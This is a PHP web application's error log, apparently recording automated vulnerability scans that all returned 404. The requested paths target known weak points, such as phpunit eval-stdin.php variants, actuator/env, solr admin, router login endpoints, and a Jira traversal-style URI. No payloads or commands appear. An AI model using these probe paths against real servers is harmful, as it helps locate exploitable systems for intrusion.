2025-10-24 03:46:28 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:28 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v3/api-docs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:28 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api-docs/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:28 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api-docs/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: api/swagger.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL @vite/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL actuator/env was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:29 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:29 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: php-cgi/php-cgi.exe ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:29 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:29 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL server was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL debug/default/view was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:30 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:30 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:30 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:30 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: login.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:31 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:31 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL _all_dbs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 03:46:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: s/331313e2438313e28323e24333/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:31 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 03:46:31 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config.json ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 03:46:32 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 03:46:32 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL telescope/requests was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:20 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 04:23:20 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 04:23:21 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 04:23:21 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 04:23:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL sdk was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL sdk was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL odinhttpcall1761269001 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL odinhttpcall1761269001 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL HNAP1 was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:21 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL evox/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:21 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL evox/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:22 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 04:23:22 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 04:23:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL query was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL v2/_catalog was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL solr/admin/info/system was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL solr/admin/info/system was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:22 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authLogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 04:23:22 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authLogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 04:23:22 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL solr/admin/cores was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 04:23:22 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL solr/admin/cores was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 04:23:24 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 04:23:24 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: favicon.ico ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 04:30:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 04:30:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/luci/;stok=/locale ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:11:54 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:11:54 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: hello.world ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:11:56 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:11:56 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:11:57 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:11:57 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:11:58 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:11:58 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:11:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:11:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:11:59 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:11:59 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/phpunit/phpunit/LICENSE/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:00 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:00 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:01 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:01 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:02 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:02 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:03 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:03 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:04 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:04 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:05 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:05 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:06 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:06 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:07 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:07 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/phpunit/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:08 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:08 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:09 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:09 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:10 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:10 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:11 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:11 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:12 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:12 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:13 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:13 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 05:12:14 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 05:12:14 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
